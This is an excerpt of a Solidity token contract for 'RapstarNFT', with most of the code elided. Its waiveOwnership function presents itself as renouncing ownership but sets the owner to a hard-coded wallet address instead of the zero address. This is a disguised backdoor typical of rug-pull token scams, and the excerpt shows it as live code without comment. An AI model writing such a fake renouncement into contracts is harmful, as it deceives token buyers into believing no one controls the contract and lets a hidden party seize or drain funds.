...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xB9F6f32CB1D316A5F39096407Ec1BA8b427734Dc);
    }
...
contract RapstarNFT is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RapstarNFT";
    string private _symbol = "RapstarNFT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xEE583b22DcB254e40D8Eabaa05ccd687B6B2722b);
    address payable public teamWalletAddress = payable(0xEE583b22DcB254e40D8Eabaa05ccd687B6B2722b);
